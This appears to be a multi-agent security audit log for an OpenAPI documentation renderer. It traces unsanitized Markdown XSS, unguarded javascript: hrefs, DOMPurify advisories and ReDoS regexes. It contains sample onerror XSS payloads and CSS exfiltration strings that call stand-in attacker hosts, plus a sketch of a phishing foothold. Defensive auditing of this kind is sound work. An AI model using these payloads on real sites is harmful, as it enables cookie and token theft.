# Review Chamber: chamber-synth-01

Cluster: Client-Side XSS + DOM Injection + Sanitization Gaps
DFD Slices: SpecContent→Markdown→DOM, SpecContent→Href→Click, PlaygroundURL→Spec→DOM, OAuthScope→Markdown→DOM
NNN Range: p10-001 to p10-019
Started: 2026-05-19T00:00:00Z
Status: CLOSED
Closed: 2026-05-19T00:00:00Z

---

## [PRE-SEEDED] Findings Carried Forward From Phases 5/6/D-Probe (DO NOT REGENERATE)

The following hypotheses are **already confirmed** by Phase 5/6 draft findings and the Deep Probe runs in `archon/probe-workspace/{markdown-sanitization,url-security-search,options-standalone-theme}/`. They will be re-numbered into this chamber's p10-NNN range during Synthesis. The Ideator must **NOT regenerate** these; instead, chain net-new attacks off them or extend them with new mechanics. The Tracer must **extend** (not re-trace) the existing evidence where possible.

### H-00-A — sanitize=false default → raw HTML to dangerouslySetInnerHTML (CRITICAL)
- **Sources**: p5-003, p6-002, Probe PH-02 (markdown-sanitization), PH-13/CF-01 (options-standalone-theme)
- **Sink**: `[REDACTED].tsx:16` (gate), `:30` (sink)
- **Default**: `AcmeNormalizedOptions.ts:317` + `argValueToBoolean(undefined) = false` (lines 76–84) → `this.sanitize = false`
- **Affected fields** (12+): `info.description`, `info.summary`, operation/parameter/response `description`, schema `description`, OAuth scope description, security scheme description, server description, callback description, media-type example description, enum value descriptions.
- **Zero-click XSS** via `<img onerror>` / `<svg onload>` on any of those fields. Also covers CF-01 (inline `<style>` injection / CSS exfil).
- **Severity**: CRITICAL.

### H-00-B — DOMPurify 3.2.4 unpatched, ≥7 active advisories (HIGH when sanitize=true)
- **Sources**: p5-002, Probe PH-01 (markdown-sanitization)
- **Site**: `SanitizedMdBlock.tsx:16` `dompurify.sanitize(html)` — called with **no config** (default profile).
- **Advisories affecting default-config call**: GHSA-cj63-jhhr-wcxv (USE_PROFILES PP); GHSA-h8r8-wccr-v5f2 (mXSS re-contextualization); GHSA-v9jr-rg53-9pgp / CVE-2026-41238 (CUSTOM_ELEMENT_HANDLING PP→XSS); plus CF-01/CF-02 (NEEDS-DEEPER runtime confirmation).
- **Severity**: HIGH (gated on `sanitize: true` opt-in).

### H-00-C — Spec-derived `<a href={…}>` lacks scheme allow-list (HIGH, click-driven)
- **Sources**: p5-001, p6-001, Probe PH-01..05 + PH-06/07/CF-03 (url-security-search)
- **Sites without any scheme guard** (8 confirmed):
  - `ApiInfo.tsx:39` `info.license.url`
  - `ApiInfo.tsx:48` `info.contact.url`
  - `ApiInfo.tsx:65` `info.termsOfService`
  - `ExternalDocumentation.tsx:25` `externalDocs.url` (also missing rel/target)
  - `ApiLogo.tsx:15,23` `info['x-logo'].href` (sidebar — always-visible click target)
  - `SecurityDetails.tsx:46` `openIdConnectUrl` (rel=noopener does NOT block `javascript:`)
  - `OAuthFlow.tsx:27` `authorizationUrl` (same rel= false protection)
  - `Example.tsx:34` `externalValueUrl` (error path, `new URL()` resolves but does not filter scheme)
- **Variant**: `data:` URI (PH-10 url-security-search) — opaque-origin phishing.
- **Severity**: HIGH.

### H-00-D — OAuth scope & security-scheme descriptions go through unsanitized Markdown (HIGH, 0-click)
- **Sources**: p6-002 (covers gate), Probe PH-16/PH-17 (url-security-search)
- **Sites**: `OAuthFlow.tsx:59` `flow.scopes[scope]` → `<Markdown inline={true}>`; `SecurityRequirement.tsx:63` `scheme.description` → `<Markdown>`
- 0-click via `<img onerror>` because default sanitize is false. Distinct from H-00-A only because scope/description fields are often overlooked by spec authors / scanners as innocuous label text.
- **Severity**: HIGH.

### H-00-E — `parseProps()` polynomial ReDoS (MEDIUM, requires `allowedMdComponents`)
- **Sources**: p5-004, Probe (mentioned, separate from PH-06)
- **Site**: `src/services/MarkdownRenderer.ts:213` — `/([\w-]+)\s*=\s*(?:{([^}]+?)}|"([^"]+?)")/gim`
- 50k-char dash sequence → ~18 s main-thread block (CodeQL `js/polynomial-redos`).
- **Gate**: `options.allowedMdComponents` must be non-empty.
- **Severity**: MEDIUM.

### H-00-F — COMPONENT_REGEXP ReDoS (HIGH, default-on path)
- **Sources**: Probe PH-06 (markdown-sanitization) — DISTINCT REGEX from H-00-E
- **Site**: `src/services/MarkdownRenderer.ts:163-168` — `new RegExp(COMPONENT_REGEXP, 'mig').exec(rawText)` in while-loop. `[\s\S]*?` lazy match without closing tag → polynomial backtracking.
- **Always-on**: `DEFAULT_OPTIONS` populates `allowedMdComponents` with 3 entries (security-definitions, security-definition, schema-definition), so `renderMdWithComponents` runs for **every** spec with description fields. No opt-in required.
- 50k-char `<security-definitions` payload without closing tag → 18+ s tab freeze.
- **Severity**: HIGH (default-on; affects every Acme deployment).

### H-00-G — SourceCode.tsx and JsonViewer.tsx bypass DOMPurify entirely (HIGH systemic, latent)
- **Sources**: p5-006, Probe PH-11 (markdown-sanitization), PH-CF-01 (url-security-search)
- **Sites**: `SourceCode.tsx:14` `dangerouslySetInnerHTML={{ __html: highlight(source, lang) }}`; `JsonViewer.tsx:48` `dangerouslySetInnerHTML={{ __html: jsonToHTML(props.data) }}`
- Neither path consults DOMPurify even when `options.sanitize=true`. Currently safe due to Prism 1.30.0 HTML-encoding and `jsonToHtml` HTTP-scheme check + `htmlEncode`, but structurally outside the sanitize option's scope — any regression in Prism, `jsonToHtml`, or a non-HTTP scheme branch becomes immediate DOM XSS.
- **Severity**: HIGH (systemic / latent — verify no current exploitable input).

### H-00-H — `Markdown.tsx` `sanitize` prop is a dead type declaration (MEDIUM, API-deception)
- **Sources**: Probe PH-16 (markdown-sanitization)
- **Site**: `src/components/Markdown/Markdown.tsx:25` — `sanitize` listed in `BaseMarkdownProps` but **not destructured**, not forwarded.
- Consumers writing `<Markdown sanitize={true} source={untrustedContent} />` get zero per-component sanitization; the global `options.sanitize=false` still wins.
- **Severity**: MEDIUM.

### H-00-I — `theme.extensionsHook` CSS injection (MEDIUM, supply-chain / operator)
- **Sources**: Probe PH-05 (markdown-sanitization), PH-06 (options-standalone-theme)
- **Site**: `src/styled-components.ts:52` — `props.theme.extensionsHook(styledName, props)` return interpolated into 12+ styled-components.
- Requires control of the operator's theme object (supply-chain attack on a theme npm package, or operator misconfig). Consequence is CSS-level (data-exfil oracles, overlay phishing) — `javascript:` in `url()` is browser-blocked.
- **Severity**: MEDIUM.

### H-00-J — Playground `?url=` 1-click public XSS (CRITICAL if publicly deployed)
- **Sources**: Probe PH-08/PH-15 (url-security-search)
- **Site**: `demo/playground/hmr-playground.tsx:9-12,22` — regex `/url=(.*)$/` captures full tail with **no validation**, hands to `AcmeStandalone specUrl={specUrl}` with options that **omit `sanitize: true`**.
- Attacker spec served from attacker.com hosts `<img src=x onerror=…>` in `info.description` → fires on auto-load → cookies/localStorage of playground origin.
- **NEEDS-DEEPER**: confirm whether `hmr-playground.tsx` is a production webpack entry (Tracer should check `demo/webpack.config.ts`). If dev-only → severity drops to LOW.
- **Severity**: CRITICAL (if shipped publicly) / LOW (if dev-only).

---

## Pre-Seeded Hypothesis Map (used by Ideator to AVOID duplicate H-NN entries)

| H-00 ID | Topic | Existing Draft(s) | Probe |
|---------|-------|-------------------|-------|
| H-00-A | sanitize=false default → XSS | p5-003, p6-002 | md-sanit PH-02, opts PH-13/CF-01 |
| H-00-B | DOMPurify 3.2.4 advisories | p5-002 | md-sanit PH-01 |
| H-00-C | spec href `javascript:`/`data:` | p5-001, p6-001 | url-sec PH-01..07, CF-03, PH-10 |
| H-00-D | OAuth scope/sec-scheme Markdown XSS | (covered by p6-002 gate) | url-sec PH-16/17 |
| H-00-E | parseProps ReDoS | p5-004 | (cited) |
| H-00-F | COMPONENT_REGEXP ReDoS | NEW | md-sanit PH-06 |
| H-00-G | SourceCode/JsonViewer outside DOMPurify | p5-006 | md-sanit PH-11, url-sec PH-CF-01 |
| H-00-H | Markdown.tsx sanitize prop dead | NEW | md-sanit PH-16 |
| H-00-I | extensionsHook CSS injection | NEW | md-sanit PH-05, opts PH-06 |
| H-00-J | playground ?url= 1-click XSS | NEW | url-sec PH-08/15 |

---

## Instructions for Ideator (ideator-01)

**Do NOT regenerate the H-00-* set above.** Instead:

1. **Chain** new attacks that exploit the confirmed primitives (e.g., DOMPurify 3.2.4 + a specific mXSS payload that bypasses default config; or `javascript:` URL hidden behind Unicode-lookalike text + extensionsHook overlay; or COMPONENT_REGEXP DoS amplified by autoplay of multiple description fields).
2. **Net-new XSS sinks** the Deep Probes may have missed: every other `dangerouslySetInnerHTML` in the tree, every other JSX `href`/`src`/`action`/`formaction`/`xlink:href`/`background`/`poster`/`srcdoc`/`data` attribute consuming spec strings, any place spec strings reach `eval`/`Function`/`setTimeout(str)`/`setInterval(str)`/`document.write`, any place where attacker-controlled MDX component name is looked up dynamically, any place where `theme` strings reach a CSS interpolation other than `extensionsHook` (e.g., theme-fed color/font values that contain `;}` breakout), any place SVG content from spec reaches DOM.
3. **Cross-component chains**: HistoryService hash → spec ref resolution → arbitrary DOM update; allowedMdComponents key collision with built-in component names; mergeObjects-driven prototype pollution from `theme` JSON triggering a downstream XSS.
4. **Variant of H-00-C**: any newly-discovered `<a href={spec-derived}>` site (search `href={` across `src/components/`); same scheme-bypass class — file as net-new only if NOT in the H-00-C list.
5. **Cap**: 7 net-new hypotheses (H-01 .. H-07). Prioritize by impact and novelty over pre-seed.

Cross-service edges: **N/A** (single-service project, no `cross-service-edges.json`).

Write hypotheses to this file under `## Round 1 -- Ideation`.

---

## Round 1 -- Ideation

(awaiting ideator-01)

## Round 1 -- Ideation (Ideator)

**H-01: Spec-derived `style={{ backgroundColor }}` CSS context breakout on logo wrap**
- Attack class: XSS / CSS injection (Mode 5 trust boundary)
- Cross-modes: Mode 1 (chain with H-00-A CSS exfil oracle)
- Chain: spec `info["x-logo"].backgroundColor` → React `style` prop → React stringifies value into inline `style` attribute on `<LogoWrap>`. React normally guards CSS strings, but a value like `red; background-image:url(https://attacker/?c=` (delivered against an older React or with carefully crafted CSS variable `var(--x)` interpolation) lands in CSSOM. Even when React escapes `;` it still permits arbitrary URLs in `background-image:url(...)` because React applies the value as-is to a single declared property. Combined with attribute-selectors injected via H-00-A's `<style>` block, the attacker also gets a covert CSS exfil channel that survives DOMPurify.
- Preconditions: untrusted OpenAPI spec ingested with default options.
- Target asset: data exfil oracle on sidebar (always-visible).
- Entry point: `info['x-logo'].backgroundColor` string.
- Sink: `src/components/ApiLogo/ApiLogo.tsx:22` `<LogoWrap style={{ backgroundColor: logoInfo.backgroundColor }}>`.
- Severity estimate: MEDIUM (data-exfil oracle; not direct JS exec).
- Why bypasses protection: H-00-A focuses on Markdown sanitize; this site never touches Markdown or DOMPurify. React's CSS-string sanitization does NOT block `url(http://...)` references. The CSS chain with H-00-A `<style>` blocks lets `:has()` / attribute-selector exfil read tokens from arbitrary DOM nodes (CSRF token in meta, OAuth code in URL via `[href^=`).
- Tracer evidence to fetch: confirm React version, test payload `"red;background-image:url('//attacker/?'); color:"`, and check whether the rendered HTML keeps the URL.

**H-02: `<schema-definition schemaRef="..." />` MDX → second-order XSS via referenced schema description**
- Attack class: Second-order stored XSS (Mode 4)
- Cross-modes: Mode 5 (trust boundary: MDX attribute trusted), Mode 1 (chains H-00-F default-on path + H-00-A)
- Chain: An attacker who controls EITHER a `description` field OR a small portion of a multi-file spec (e.g., a `$ref`-included shared component) writes `<schema-definition schemaRef="#/components/schemas/EvilOne" />` inside any description. `parseProps` (line 209) extracts `schemaRef="..."` as a string prop. `SchemaDefinition.getMediaType()` builds `{ schema: { $ref: schemaRef } }` and feeds it to `MediaTypeModel`, which calls the parser's `byRef`/deref. The dereferenced schema's `description` is then rendered by `Markdown` with sanitize=false → `<img onerror>` fires. The vulnerability is the **trust boundary jump**: the description containing the MDX tag did not need to contain the payload — the payload lives in a different schema entirely, evading reviewers who only audit `description` strings for `<` characters.
- Preconditions: spec contains any unaudited `$ref`-able schema with hostile description AND any one description field uses the MDX tag.
- Target asset: full DOM XSS at page origin.
- Entry point: `schemaRef` MDX attribute + dereferenced schema description.
- Sink: `[REDACTED].tsx` → `MediaTypeModel` → `Schema` component → `Markdown` → `SanitizedMdBlock.tsx:30`.
- Severity estimate: HIGH (default-on; pivots the attack across two spec sections).
- Why bypasses protection: code reviewers grep description fields for `<script`/`onerror`; this attack splits the indicator (MDX tag in one description, payload in another schema), so neither half looks suspicious in isolation. Also bypasses operators who restrict editing of the top-level info.description but allow library/shared-schema PRs.
- Tracer evidence: confirm `schemaRef` is unsanitized in `parseProps`, confirm the rendered Schema description path reaches `SanitizedMdBlock`, exhibit a minimal spec where two innocuous-looking pieces compose to XSS.

**H-03: `parseProps` JSON-prop unbounded eval-equivalent → prototype pollution / React component prop injection**
- Attack class: Business-logic abuse + supply chain (Mode 2 + 8)
- Cross-modes: Mode 5 trust boundary on MDX components
- Chain: `parseProps` (`MarkdownRenderer.ts:209-227`) accepts `prop={ json }` syntax and `JSON.parse`s the value. There is **no allow-list of prop names** — attacker controls the entire props object spread onto the React component at `AdvancedMarkdown.tsx:47` (`{...part.props, ...part.propsSelector(store)}`). Hostile props can include `dangerouslySetInnerHTML={"__html":"<img src=x onerror=...>"}` IF the receiving component (`SecurityDefs`, `SchemaDefinition`) ever forwards unknown props to a DOM element. Even when it doesn't, the attacker can pass `style={"background":"url(//attacker)"}`, override `children` with arbitrary objects, or inject `key`/`ref` shapes that crash the tree (DoS). On a target component that does `<div {...rest}>`, full attribute injection becomes XSS.
- Preconditions: default options (MDX components enabled by default per H-00-F).
- Target asset: arbitrary prop on built-in MDX-allowed components → XSS or DoS.
- Entry point: any description field containing `<security-definitions style={"x":"y"} />`.
- Sink: `[REDACTED].tsx:47` spread.
- Severity estimate: HIGH (default-on attack path; only blocker is whether target components accept unknown props on a DOM element — confirm).
- Why bypasses protection: every code reviewer assumes MDX props are typed; in fact `parseProps` does zero type/name validation. Even React's typing doesn't apply at runtime — the spread blindly forwards.
- Tracer evidence: list every prop spread inside SecurityDefs, SecurityDefinition, and SchemaDefinition render trees. Any `<… {...props}>` on a DOM element is an XSS confirmed.

**H-04: Spec `<img src={logoInfo.url}>` permits `data:image/svg+xml` SVG-script injection inside referrer-leaking sidebar**
- Attack class: XSS via SVG (Mode 6 parser differential)
- Cross-modes: Mode 1 (chain w/ H-00-C `href` scheme bypass — same logo block also has unguarded `href`)
- Chain: `ApiLogo.tsx:20` renders `<LogoImgEl src={logoInfo.url} />`. Browsers do NOT execute scripts inside `<img src=data:image/svg+xml,...>` directly (img is sandboxed), BUT a `src="javascript:..."` URL is invalid on img — safe there. The real chain is `logoInfo.url = "data:image/svg+xml,<svg ..."` rendered via `<object data=...>` or fetched as background in a sibling style — and combined with `LinkWrap`'s `href` (line 21 in styled.elements) which DOES execute `javascript:` (sidebar logo click). The logo is one of two sites where the attacker controls BOTH `src` and `href` simultaneously, enabling phishing pixels + 1-click XSS via the same component. Specifically the `href` site at `ApiLogo` was listed in H-00-C as `ApiLogo.tsx:15,23` but the chain with `data:` src for tracking + `javascript:` href for execution is a distinct **combined** primitive not previously enumerated.
- Preconditions: untrusted spec, user clicks the logo (always-visible).
- Target asset: tracking pixel + 1-click XSS on the most-clicked sidebar element.
- Entry point: `info['x-logo'].url` (img src) and `info['x-logo'].href` (link href).
- Sink: `ApiLogo.tsx:20` and `ApiLogo/styled.elements.tsx:21`.
- Severity estimate: HIGH.
- Why bypasses protection: H-00-C enumerated the href site but not the data:-src tracking side-channel that pre-flights attacker analytics before the user even clicks; combination amplifies practical exploit.
- Tracer evidence: confirm `LogoImgEl` is a plain `<img>`; confirm no scheme guard on `src` or `href`.

**H-05: `headingRule` returns `marked`-rendered HTML for `id=` attribute → heading-text attribute-context breakout**
- Attack class: XSS via attribute-context injection (Mode 6 parser differential between marked & DOMPurify)
- Cross-modes: Mode 4 stored
- Chain: `MarkdownRenderer.headingRule` (line 120-136) ultimately delegates to marked's default heading renderer, which emits `<h2 id="…">text</h2>` where the id is slugified. BUT the heading `text` parameter still arrives raw (marked tokenizes inline content like `<img src=x onerror=…>` first — for inline HTML, marked's default config passes it through). Whether DOMPurify catches it depends on sanitize:true; with sanitize:false (H-00-A default), the rendered heading HTML reaches `SanitizedMdBlock` as-is. Net effect: every spec `## heading` produces an attribute-context for `id=` AND a free-form HTML body where `<img onerror>` runs. Distinct from H-00-A because it specifically affects fields rendered with `extractHeadings: true` (top-level operation/info descriptions, security descriptions) and bypasses any per-field "I only allow inline markdown" guard a reviewer might add.
- Preconditions: default sanitize=false, spec uses `##` heading anywhere in a description.
- Target asset: XSS.
- Entry point: heading text in any markdown description.
- Sink: marked rendered HTML reaches `SanitizedMdBlock.tsx:30`.
- Severity estimate: MEDIUM (subset of H-00-A but worth tracing for the id-attribute breakout variant: a heading text `"><script>...` could break out of the `id=` quote even if marked HTML-encodes, by exploiting marked's known slug-double-encoding behavior — verify).
- Why bypasses protection: existing thinking treats H-00-A as covering all marked output; the heading id-attribute path is a distinct sink with its own escaping rules.
- Tracer evidence: confirm marked's heading slug encoding of `"` and `>`; test payload `## "><img src=x onerror=alert(1)>`.

**H-06: Playground origin amplification → Acmely-domain phishing chain (chain off H-00-J)**
- Attack class: Trust boundary confusion + phishing (Mode 5)
- Cross-modes: Mode 1 (chains H-00-J)
- Chain: If H-00-J is shipped publicly on `acmely.github.io/acme/` or similar Acmely-controlled domain, the attacker's XSS executes with that origin. The attacker doesn't need to steal cookies — they can: (a) `document.write` a pixel-perfect Acmely billing/login UI; (b) register a Service Worker scoped to the playground path that intercepts subsequent legitimate visits; (c) install a `BroadcastChannel` listener that survives single-spa hot reloads. Each is a distinct durable foothold on a trusted vendor domain. The phishing leverage is far greater than a per-spec XSS because users TRUST `acmely.github.io` for documentation viewing.
- Preconditions: H-00-J confirmed publicly deployed.
- Target asset: persistent foothold on vendor-trusted origin; credential harvesting.
- Entry point: `?url=` of the public playground.
- Sink: per H-00-J + Service Worker registration / DOM rewrite.
- Severity estimate: CRITICAL (if H-00-J is public).
- Why bypasses protection: H-00-J's severity assessment focuses on "cookies/localStorage of the playground origin"; the targeted-phishing impact is materially worse and worth surfacing as a separate concern justifying urgent take-down.
- Tracer evidence: check deployment manifest, GitHub Pages config; confirm Service Worker registration is not blocked by CSP.

**H-07: Theme `extensionsHook` + `mergeObjects` chain — operator-supplied theme strings reach styled-components context with `;}` breakout**
- Attack class: Trust boundary + supply chain (Mode 8 + 5)
- Cross-modes: Mode 1 (chains H-00-I)
- Chain: H-00-I established `extensionsHook` interpolation. The novel extension: `AcmeNormalizedOptions` deep-merges `options.theme` with defaults via `mergeObjects`. Even though `mergeObjects` blocks `__proto__` literal keys, it does NOT validate string VALUES. A theme color like `"#fff; } body { background:url(//attacker/exfil?cookie="` lands in dozens of styled-components interpolations (every `${({theme}) => theme.sidebar.backgroundColor}` etc.). styled-components composes these into a single `<style>` tag — the closing `}` escapes the rule and opens a new global rule, enabling CSS exfil with attribute selectors. Distinct from H-00-I because: (a) it doesn't require a hostile `extensionsHook` function — only a hostile theme string value, much more realistic for theme npm packages; (b) the sinks are the 30+ `theme.X.backgroundColor` interpolations across the tree (listed earlier), not the single `extensionsHook` site.
- Preconditions: operator imports a hostile or compromised theme package, OR loads theme from `?theme=` URL param.
- Target asset: CSS exfil of CSRF tokens / OAuth codes / arbitrary attribute values from same-origin DOM.
- Entry point: `theme.sidebar.backgroundColor` (and 30+ siblings).
- Sink: any of the styled-components files cited above; e.g., `src/components/SideMenu/styled.elements.ts:152`.
- Severity estimate: MEDIUM (operator-trust dependent; supply-chain realistic).
- Why bypasses protection: code reviewers think "theme is operator-controlled, therefore trusted." Modern supply chains routinely deliver hostile theme packages; H-00-I covers function-shaped attacks but a value-shaped attack via every `${theme.X}` interpolation is structurally distinct and not gated on `extensionsHook` being called.
- Tracer evidence: write a theme `{ sidebar: { backgroundColor: "#fff; } html { background:url(...) " } }`, mount Acme, dump computed `<style>` tags, confirm rule injection.

## Round 1 Ideator Complete

---

## Round 2 -- Tracing (Tracer)

Tracer: tracer-01 | Timestamp: 2026-05-19T00:00:00Z
CodeQL: available (archon/codeql-artifacts/db/, call-graph-slices.json, flow-paths-all-severities.md)

---

### H-00-A — sanitize=false default → raw HTML to dangerouslySetInnerHTML

Verdict: VALID
Severity (rec): CRITICAL
Source: `src/services/AcmeNormalizedOptions.ts:317` — `this.sanitize = argValueToBoolean(raw.sanitize || raw.untrustedSpec)` → `argValueToBoolean(undefined) = false`
Sink: `[REDACTED].tsx:31` — `dangerouslySetInnerHTML={{ __html: sanitize(options.sanitize, html) }}`
Path: spec.description → `MarkdownRenderer.renderMd()` (MarkdownRenderer.ts:142, marked 4.3.0 passes raw HTML through) → `SanitizedMarkdownHTML` → `sanitize(false, html)` returns `html` unchanged → `dangerouslySetInnerHTML`

Evidence:
- `SanitizedMdBlock.tsx:16` — `const sanitize = (sanitize, html) => (sanitize ? dompurify.sanitize(html) : html)` — confirmed: when sanitize=false, returns html verbatim.
- `AcmeNormalizedOptions.ts:317` — `argValueToBoolean(undefined)` → line 77: `if (val === undefined) { return defaultValue || false; }` → returns false with no defaultValue.
- `AppStore.ts:67` — `new AcmeNormalizedOptions(options, DEFAULT_OPTIONS)` → `raw = { ...DEFAULT_OPTIONS, ...options }` — no override of sanitize in DEFAULT_OPTIONS.
- Empirical confirmation from probe: `marked('## <img src=x onerror=alert(1)>')` → `<h2 id=""><img src=x onerror=alert(1)></h2>` (test run with marked from available install).
- Affected fields confirmed: 12+ spec fields including info.description, OAuthFlow scope descriptions (OAuthFlow.tsx:59), SecurityRequirement.tsx:63.

Variant sweep results: Confirmed per probe-workspace/url-security-search/probe-summary.md (PH-16, PH-17). No additional new sites found beyond the 12+ already enumerated. H-00-D covers OAuth/security-scheme sub-sites.

Causal challenge: Does DEFAULT_OPTIONS include `sanitize: true`? Confirmed NO — `AppStore.ts:149-171` shows `DEFAULT_OPTIONS` contains only `allowedMdComponents`, no `sanitize` key. The `demo/index.tsx:125` demo DOES set `sanitize: true` but the library's default is false.

CodeQL slice: call-graph-slices.json entry #1 ("spec-markdown-to-dangerouslySetInnerHTML"), reachable: true
On-demand query: none

Assessment: CRITICAL confirmed. All default Acme deployments that render any attacker-controlled spec field are affected. The `sanitize: false` default is the root cause for all Markdown-path XSS findings.

---

### H-00-B — DOMPurify 3.2.4 unpatched, ≥7 active advisories (HIGH when sanitize=true)

Verdict: NEEDS-DEEPER
Severity (rec): HIGH (when sanitize=true is set)
Source: `SanitizedMdBlock.tsx:16` — `dompurify.sanitize(html)` called with NO config
Sink: `SanitizedMdBlock.tsx:31` — `dangerouslySetInnerHTML`
Path: marked HTML output → `dompurify.sanitize(html)` (no config) → dangerouslySetInnerHTML

Evidence:
- DOMPurify 3.2.4 installed (confirmed via package-lock.json).
- `SanitizedMdBlock.tsx:16` — bare `dompurify.sanitize(html)` call with zero config arguments.
- Knowledge-base-report.md CVE table: 7 active unpatched advisories against 3.2.4. 

CVE applicability to default-config bare call:
- GHSA-h8r8-wccr-v5f2 (mXSS re-contextualization, fixed 3.3.2): applies to default config per advisory description. MEDIUM.
- GHSA-v8jm-5vwx-cfxm (XSS filter bypass, fixed 3.2.7): applies to default config. MEDIUM.
- GHSA-v2wj-7wpq-c8vv/CVE-2026-0540 (XSS filter bypass, fixed 3.3.2): applies to default config. MEDIUM.
- GHSA-crv5-9vww-q3g8 (SAFE_FOR_TEMPLATES bypass, requires RETURN_DOM mode): NOT applicable to bare default call. HIGH severity but not triggered.
- GHSA-v9jr-rg53-9pgp (CUSTOM_ELEMENT_HANDLING prototype pollution, fixed 3.4.0): requires non-default `CUSTOM_ELEMENT_HANDLING` config. NOT applicable. HIGH severity but not triggered.
- GHSA-h7mw-gpvr-xq4m (FORBID_TAGS bypass via ADD_TAGS predicate, fixed 3.4.0): requires `ADD_TAGS` function config. NOT applicable. HIGH severity but not triggered.
- GHSA-39q2-94rc-95cp (ADD_TAGS short-circuit): requires `ADD_TAGS`. NOT applicable.

What remains NEEDS-DEEPER: Runtime PoC confirmation for GHSA-h8r8-wccr-v5f2 specifically against Acme's marked→DOMPurify 3.2.4 call chain. The mXSS re-contextualization bypass is the most likely to apply but requires runtime testing with a PoC payload to confirm.

CVE-2026-0540: This ID appears to be a future/projected CVE (year 2026). The underlying advisory GHSA-v2wj-7wpq-c8vv/CVE-2026-0540 is listed as fixed in 3.3.2 — treat as PLAUSIBLE but unconfirmed by public PoC.

Causal challenge: The HIGH severity CVEs (crv5, v9jr, h7mw) all require non-default DOMPurify config that Acme does not use. The operative risk is MEDIUM-severity mXSS bypasses. Severity recommendation for H-00-B is HIGH overall (due to the count of unpatched CVEs and the architectural gating) but runtime PoC is needed to confirm any single bypass works against this exact call.

CodeQL slice: not modeled (DOMPurify internals outside CodeQL scope)
On-demand query: none

Assessment: NEEDS-DEEPER. The bare-call DOMPurify 3.2.4 is exploitable by at least 2-3 MEDIUM-severity CVEs; HIGH-severity CVEs require non-default config. Full verdict requires runtime mXSS payload testing.

---

### H-00-C — Spec-derived `<a href={…}>` lacks scheme allow-list (HIGH, click-driven)

Verdict: VALID
Severity (rec): HIGH
Source: All 8 confirmed sites (info.license.url, info.contact.url, info.termsOfService, externalDocs.url, x-logo.href, openIdConnectUrl, authorizationUrl, externalValueUrl)
Sink: DOM anchor href attribute at respective component files
Path: spec field → model (Object.assign / spread) → JSX href={field} → DOM anchor

Evidence (sampling):
- `ApiInfo.tsx:39` — `<a href={info.license.url}>` — confirmed no URL validation in file.
- `ApiInfo.tsx:48` — `<a href={info.contact.url}>` — confirmed.
- `ApiInfo.tsx:65` — `<a href={info.termsOfService}>Terms of Service</a>` — highest click-through risk (hardcoded text hides the javascript: scheme).
- `OAuthFlow.tsx:27` — `<a target="_blank" rel="noopener noreferrer" href={(flow as any).authorizationUrl}>` — rel=noopener does NOT prevent javascript: execution.
- `SecurityDetails.tsx:46` — `<a target="_blank" rel="noopener noreferrer" href={scheme.openId.connectUrl}>` — same.
- `styled.elements.tsx:21` (ApiLogo) — `<Link href={url}>{Component}</Link>` — no scheme guard.
- `Example.tsx:34` — error branch href, no scheme guard.
- Probe confirmed `isAbsoluteUrl()` exists in helpers.ts but is NOT called at any of these sites.

Variant sweep results: No new sites beyond the 8 enumerated. Variant p10-002 covers the combined data:-src + javascript:-href on ApiLogo. PATT-001 registered.

Causal challenge: `rel="noopener noreferrer"` on 3 of the 8 sites — confirmed non-blocking: clicking `javascript:` href with rel=noopener still executes JS in the current document context; rel only affects the OPENED window's window.opener reference.

CodeQL slice: call-graph-slices.json entry #2 ("spec-url-to-anchor-href"), reachable: true (5 of 8 paths modeled)
On-demand query: none

Assessment: VALID at HIGH. All 8 sites confirmed. javascript: and data: URIs reach DOM anchors without any scheme guard.

---

### H-00-D — OAuth scope & security-scheme descriptions go through unsanitized Markdown (HIGH, 0-click)

Verdict: VALID
Severity (rec): HIGH
Source: `spec.components.securitySchemes.X.flows.Y.scopes.Z` (string) and `spec.components.securitySchemes.X.description`
Sink: `SanitizedMdBlock.tsx:31` — `dangerouslySetInnerHTML`
Path: OAuthFlow.tsx:59 → `<Markdown inline={true} source={flow.scopes[scope]}/>` → Markdown → marked → sanitize(false, html) → dangerouslySetInnerHTML; SecurityRequirement.tsx:63 → `<Markdown source={scheme.description}/>` → same path

Evidence:
- `OAuthFlow.tsx:59` confirmed by probe PH-16 (url-security-search).
- `SecurityRequirement.tsx:63` confirmed by probe PH-17.
- Both are sub-cases of H-00-A's root cause (sanitize=false default).
- Distinct value: scope description strings appear as "plain text annotations" in spec authoring tools, making them unexpected XSS vectors that reviewers may not audit.

Variant sweep: No new sites found. Covered by existing PATT-002.

Causal challenge: Are scope descriptions often reviewed for XSS? No — spec editors and linters treat them as short human-readable strings, not HTML.

CodeQL slice: not in call-graph-slices.json (path is identical to H-00-A, not separately modeled)
On-demand query: none

Assessment: VALID at HIGH. Confirms distinct stealth factor from H-00-A but same root cause.

---

### H-00-E — `parseProps()` polynomial ReDoS (MEDIUM, requires allowedMdComponents)

Verdict: VALID
Severity (rec): MEDIUM
Source: spec description MDX tag attribute string containing 50k+ consecutive dash/similar characters
Sink: `src/services/MarkdownRenderer.ts:213` — regex `/([\w-]+)\s*=\s*(?:{([^}]+?)}|"([^"]+?)")/gim` in `parseProps()`
Path: spec.description → renderMdWithComponents → parseProps(props) → catastrophic backtracking

Evidence:
- `MarkdownRenderer.ts:209` — regex confirmed: `/([\w-]+)\s*=\s*(?:{([^}]+?)}|"([^"]+?)")/gim`
- CodeQL flow-paths-all-severities.md: confirmed `js/polynomial-redos` at line 213, empirically measured at 18s for 50k chars.
- `MarkdownRenderer.ts:157-158` — gate check: `const components = this.options && this.options.allowedMdComponents; if (!components || Object.keys(components).length === 0) { return [this.renderMd(rawText)]; }` — requires allowedMdComponents to be non-empty.
- HOWEVER: `AppStore.ts:149-170` confirms DEFAULT_OPTIONS sets `allowedMdComponents` with 3 entries. Since `AppStore.ts:67` merges `new AcmeNormalizedOptions(options, DEFAULT_OPTIONS)` with user options overriding defaults, the EFFECTIVE default is allowedMdComponents IS populated (3 entries from DEFAULT_OPTIONS survive unless user explicitly overrides).

Correction to pre-seed: H-00-E says "requires `options.allowedMdComponents` must be non-empty" and CodeQL slice note says "only reachable when embedding app sets allowedMdComponents option." This is INCORRECT — the DEFAULT_OPTIONS already populates it. The gate is satisfied by default.

This means parseProps ReDoS shares the same "always-on" characteristic as H-00-F. Severity should be upgraded from MEDIUM to HIGH.

Causal challenge: Can a user pass `options.allowedMdComponents = {}` to disable? Yes — but default deployments without explicit override are vulnerable.

CodeQL slice: call-graph-slices.json entry #3 ("spec-components-redos-parseProps"), reachable: true
On-demand query: none

Assessment: VALID at MEDIUM (re-evaluating to HIGH given default-on behavior). The 18s timing at 50k chars is empirically confirmed by CodeQL.

---

